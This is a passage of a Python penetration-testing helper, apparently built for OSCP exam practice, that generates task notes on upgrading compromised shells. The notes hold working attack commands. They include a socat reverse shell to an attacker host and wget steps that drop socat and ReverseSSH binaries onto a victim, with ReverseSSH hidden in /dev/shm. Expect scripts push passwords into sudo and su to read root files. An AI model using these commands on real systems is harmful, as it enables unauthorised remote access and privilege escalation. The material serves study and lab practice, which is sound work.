                    '2. Use native shells (bash, PowerShell)',
                    '3. Write custom payloads',
                    '4. Focus on other vectors (don\'t waste time)'
                ],
                'estimated_time': 'Reference only'
            }
        })

        return tasks

    def _get_tty_upgrade_tasks(self, target: str, os_type: str = 'linux') -> Dict[str, Any]:
        """Full TTY upgrade techniques"""
        tasks = {
            'id': 'tty-upgrade',
            'name': f'Full TTY Upgrade: {target}',
            'type': 'parent',
            'children': []
        }

        if os_type == 'linux':
            # Python PTY upgrade
            tasks['children'].append({
                'id': 'python-pty-upgrade',
                'name': 'Python PTY Upgrade (Most Common)',
                'type': 'manual',
                'metadata': {
                    'description': 'Upgrade basic shell to full TTY using Python',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'LINUX'],
                    'notes': [
                        'FULL UPGRADE PROCEDURE:',
                        '',
                        '1. Spawn PTY shell with Python:',
                        '   python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                        '   OR: python -c \'import pty; pty.spawn("/bin/bash")\'',
                        '',
                        '2. Background shell:',
                        '   Press: CTRL+Z',
                        '',
                        '3. Configure local terminal:',
                        '   stty raw -echo; fg',
                        '',
                        '4. Reset terminal in shell:',
                        '   Press: ENTER (twice)',
                        '   Type: reset',
                        '   Press: ENTER',
                        '',
                        '5. Set environment variables:',
                        '   export SHELL=/bin/bash',
                        '   export TERM=screen',
                        '',
                        '6. Set terminal size (optional but recommended):',
                        '   Get your size: stty -a (on local machine, in another terminal)',
                        '   Set size: stty rows <ROWS> columns <COLS>',
                        '   Example: stty rows 38 columns 116',
                        '',
                        'WHAT THIS ACHIEVES:',
                        '- Tab completion',
                        '- Arrow keys work',
                        '- Command history (up/down arrows)',
                        '- CTRL+C works properly (doesn\'t kill shell)',
                        '- Can run interactive programs (vi, top, su, sudo)',
                        '- Proper terminal emulation',
                        '',
                        'SUCCESS INDICATORS:',
                        '- Clear screen works (clear)',
                        '- Tab completion works',
                        '- Arrow keys work',
                        '- CTRL+C doesn\'t kill shell',
                        '- su/sudo work',
                        '',
                        'ALTERNATIVE IF PYTHON NOT AVAILABLE:',
                        '- Try script method',
                        '- Try socat',
                        '- Use expect for non-TTY sudo',
                        '',
                        'EXAM TIP:',
                        'Always upgrade immediately after getting shell. Saves time and frustration.'
                    ],
                    'estimated_time': '1-2 minutes'
                }
            })

            # Script upgrade
            tasks['children'].append({
                'id': 'script-pty-upgrade',
                'name': 'Script PTY Upgrade (Alternative)',
                'type': 'manual',
                'metadata': {
                    'description': 'Upgrade shell using script command (if Python unavailable)',
                    'tags': ['OSCP:HIGH', 'MANUAL', 'LINUX'],
                    'notes': [
                        'FULL UPGRADE WITH SCRIPT:',
                        '',
                        '1. Spawn TTY with script:',
                        '   script /dev/null -qc /bin/bash',
                        '   (Note: /dev/null prevents logging to file)',
                        '',
                        '2. Background shell:',
                        '   Press: CTRL+Z',
                        '',
                        '3. Configure local terminal:',
                        '   stty raw -echo; fg',
                        '',
                        '4. Reset terminal:',
                        '   Press: ENTER',
                        '   Type: reset',
                        '   Press: ENTER',
                        '',
                        '5. Set environment:',
                        '   export SHELL=/bin/bash',
                        '   export TERM=screen',
                        '   stty rows 38 columns 116',
                        '',
                        'WHY USE SCRIPT:',
                        '- Python not installed',
                        '- Python broken',
                        '- Lightweight alternative',
                        '',
                        'NOTES:',
                        '- script is part of util-linux package',
                        '- Almost always available on Linux',
                        '- Works same as Python PTY',
                        '',
                        'SUCCESS INDICATORS:',
                        '- Same as Python method',
                        '- Full TTY functionality'
                    ],
                    'estimated_time': '1-2 minutes'
                }
            })

            # Socat upgrade
            tasks['children'].append({
                'id': 'socat-pty-upgrade',
                'name': 'Socat Full PTY (Best Quality)',
                'type': 'manual',
                'metadata': {
                    'description': 'Use socat for immediate full TTY (if socat available)',
                    'tags': ['OSCP:HIGH', 'LINUX'],
                    'notes': [
                        'SOCAT FULL TTY (BEST QUALITY):',
                        '',
                        'ATTACKER LISTENER:',
                        'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>',
                        '',
                        'VICTIM REVERSE SHELL:',
                        'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>',
                        '',
                        'WHY SOCAT:',
                        '- Fully interactive TTY immediately',
                        '- No upgrade steps needed',
                        '- Tab completion, arrow keys, CTRL+C work immediately',
                        '- Best quality shell',
                        '',
                        'LIMITATIONS:',
                        '- socat must be available on target',
                        '- Often not installed by default',
                        '- Can upload static binary if needed',
                        '',
                        'UPLOAD STATIC SOCAT:',
                        'wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat',
                        'chmod +x socat',
                        './socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>',
                        '',
                        'EXAM TIP:',
                        'If socat available, use this. Best quality. Otherwise use Python method.'
                    ],
                    'estimated_time': '2-3 minutes (if upload needed)'
                }
            })

            # Alternative spawn methods
            tasks['children'].append({
                'id': 'alternative-spawn-methods',
                'name': 'Alternative Shell Spawn Methods',
                'type': 'manual',
                'metadata': {
                    'description': 'Other ways to spawn TTY shell if Python/script unavailable',
                    'tags': ['OSCP:MEDIUM', 'MANUAL', 'LINUX'],
                    'notes': [
                        'IF PYTHON AND SCRIPT NOT AVAILABLE:',
                        '',
                        'Perl:',
                        'perl -e \'exec "/bin/sh";\'',
                        '',
                        'Ruby:',
                        'exec "/bin/sh"',
                        '',
                        'Lua:',
                        'os.execute(\'/bin/sh\')',
                        '',
                        'IRB (Ruby):',
                        'exec "/bin/sh"',
                        '',
                        'Vi/Vim:',
                        ':!bash',
                        'OR: :set shell=/bin/bash:shell',
                        '',
                        'Nmap (if old version):',
                        'nmap --interactive',
                        '!sh',
                        '',
                        'Expect (for non-TTY sudo):',
                        'expect -c \'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<PASSWORD>";send "\\r\\n";interact\'',
                        '',
                        'LIMITATIONS:',
                        '- These spawn shell but may not be full TTY',
                        '- Still need to upgrade with stty method',
                        '- Used when Python/script unavailable',
                        '',
                        'EXAM TIP:',
                        'Try these if Python fails. Then use stty upgrade method.'
                    ],
                    'estimated_time': '1 minute'
                }
            })

            # ReverseSSH
            tasks['children'].append({
                'id': 'reversessh-upgrade',
                'name': 'ReverseSSH Interactive Shell',
                'type': 'manual',
                'metadata': {
                    'description': 'Drop ReverseSSH for full interactive shell + file transfer + port forwarding',
                    'tags': ['OSCP:MEDIUM', 'LINUX'],
                    'notes': [
                        'REVERSESSH - FULL FEATURED SHELL:',
                        '',
                        'ATTACKER SETUP:',
                        '1. Download ReverseSSH:',
                        '   wget https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86',
                        '2. Start listener:',
                        '   ./reverse-sshx86 -v -l -p 4444',
                        '',
                        'VICTIM (LINUX):',
                        '1. Download:',
                        '   wget https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh',
                        '   chmod +x /dev/shm/reverse-ssh',
                        '2. Connect:',
                        '   /dev/shm/reverse-ssh -p 4444 kali@<LHOST>',
                        '',
                        'ATTACKER ACCESS:',
                        'SSH: ssh -p 8888 127.0.0.1',
                        'Password: letmeinbrudipls',
                        'SFTP: sftp -P 8888 127.0.0.1',
                        '',
                        'FEATURES:',
                        '- Full SSH access (not just shell)',
                        '- Bidirectional file transfer (SFTP)',
                        '- Port forwarding',
                        '- Interactive shell',
                        '- Persistent connection',
                        '',
                        'LIMITATIONS:',
                        '- Requires download (~1MB binary)',
                        '- More complex than simple upgrade',
                        '- Overkill for basic CTF',
                        '',
                        'USE CASES:',
                        '- Need frequent file transfers',
                        '- Need port forwarding',
                        '- Long engagement (not exam)',
                        '- Multiple pivoting',
                        '',
                        'EXAM TIP:',
                        'Not needed for exam. Use Python PTY upgrade (faster).'
                    ],
                    'estimated_time': '5 minutes'
                }
            })

            # Penelope
            tasks['children'].append({
                'id': 'penelope-upgrade',
                'name': 'Penelope Automatic Upgrade',
                'type': 'manual',
                'metadata': {
                    'description': 'Penelope: automatic Linux shell upgrade + logging + readline for Windows',
                    'tags': ['OSCP:MEDIUM', 'LINUX', 'WINDOWS'],
                    'notes': [
                        'PENELOPE - AUTOMATIC SHELL HANDLER:',
                        '',
                        'SETUP:',
                        '1. Clone: git clone https://github.com/brightio/penelope',
                        '2. Run: python3 penelope.py <LPORT>',
                        '',
                        'FEATURES:',
                        '- Automatically upgrades Linux shells to TTY',
                        '- Handles terminal size automatically',
                        '- Logs all commands and output',
                        '- Readline support for Windows shells',
                        '- Multi-session management',
                        '- Download/upload files',
                        '- Command history',
                        '',
                        'USAGE:',
                        '1. Start Penelope: python3 penelope.py 4444',
                        '2. Get reverse shell to port 4444',
                        '3. Penelope automatically:',
                        '   - Detects OS',
                        '   - Upgrades to TTY (Linux)',
                        '   - Sets terminal size',
                        '   - Logs session',
                        '',
                        'ADVANTAGES:',
                        '- No manual upgrade steps',
                        '- Automatic everything',
                        '- Session logging (great for reporting)',
                        '- Multiple shells management',
                        '',
                        'LIMITATIONS:',
                        '- Requires installation',
                        '- Adds complexity',
                        '- Not built-in to Kali',
                        '',
                        'EXAM TIP:',
                        'Install before exam for convenience. Or stick with nc + manual upgrade (more reliable).'
                    ],
                    'estimated_time': '5 minutes (initial setup)'
                }
            })

            # No TTY workarounds
            tasks['children'].append({
                'id': 'no-tty-workarounds',
                'name': 'No TTY Workarounds (Last Resort)',
                'type': 'manual',
                'metadata': {
                    'description': 'Interact with TTY-requiring programs without full TTY',
                    'tags': ['OSCP:MEDIUM', 'MANUAL', 'LINUX'],
                    'notes': [
                        'IF CANNOT GET FULL TTY:',
                        '',
                        'SUDO WITHOUT TTY (using expect):',
                        'expect -c \'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<PASSWORD>";send "\\r\\n";interact\'',
                        '',
                        'EXPLANATION:',
                        '- spawn: Run sudo command',
                        '- expect "*password*": Wait for password prompt',
                        '- send "<PASSWORD>": Send password',
                        '- interact: Hand control to user',
                        '',
                        'SU WITHOUT TTY:',
                        'expect -c \'spawn su;expect "*assword*";send "<PASSWORD>\\r\\n";interact\'',
                        '',
                        'MYSQL WITHOUT TTY:',
                        'mysql -u root -p<PASSWORD> -e "SELECT * FROM database.table;"',
                        '',
                        'SSH WITHOUT TTY:',
                        'ssh -o "StrictHostKeyChecking=no" user@host "command"',
                        '',
                        'LIMITATIONS:',
                        '- Requires expect installed',
                        '- Limited interactivity',
                        '- Awkward to use',
                        '',
                        'EXAM TIP:',
                        'Only use if cannot get full TTY. Try all upgrade methods first.'
                    ],
                    'estimated_time': '2-3 minutes'
                }
            })

        else:  # Windows
            tasks['children'].append({
                'id': 'windows-shell-upgrade',
                'name': 'Windows Shell Upgrade Options',
                'type': 'manual',
                'metadata': {
                    'description': 'Improve Windows shell experience (no true TTY on Windows)',
                    'tags': ['OSCP:MEDIUM', 'WINDOWS'],
                    'notes': [
                        'WINDOWS SHELL IMPROVEMENTS:',
                        '',
                        'NOTE: Windows doesn\'t have TTY like Linux',
                        '',
                        '1. UPGRADE CMD TO POWERSHELL:',
                        '   In cmd shell, type: powershell',
                        '',
                        '2. BETTER READLINE (Penelope):',
                        '   Use Penelope listener for Windows shells',
                        '   Adds command history and editing',
                        '',
                        '3. RLWRAP FOR LINUX LISTENER:',
                        '   rlwrap nc -lvnp 4444',
                        '   Adds readline to your side (not victim)',
                        '',
                        '4. WINRM (IF CREDENTIALS):',
                        '   evil-winrm -i <TARGET> -u <USER> -p <PASS>',
                        '   Full featured PowerShell',
                        '',
                        '5. PSEXEC (IF ADMIN CREDS):',
                        '   impacket-psexec <USER>:<PASS>@<TARGET>',
                        '   NT AUTHORITY\\SYSTEM shell',
                        '',
                        '6. METERPRETER:',
                        '   Best Windows shell experience',
                        '   Use msfvenom + handler',
                        '',
                        'LIMITATIONS:',
                        '- No true TTY on Windows',
                        '- CTRL+C kills shell (avoid)',
                        '- Arrow keys don\'t work in cmd',
                        '- PowerShell better than cmd',
                        '',
                        'EXAM TIP:',
                        'Upgrade to PowerShell immediately. More features and better for enumeration.'
                    ],
                    'estimated_time': '1 minute'
                }
            })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Generate follow-up tasks after shell obtained"""
        return []

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Manual alternatives for reverse shells"""
        return [
            'Manual shell generation using online generators',
            'Copy-paste shells from PayloadsAllTheThings',
            'Use PentestMonkey reverse shell cheat sheet'
        ]
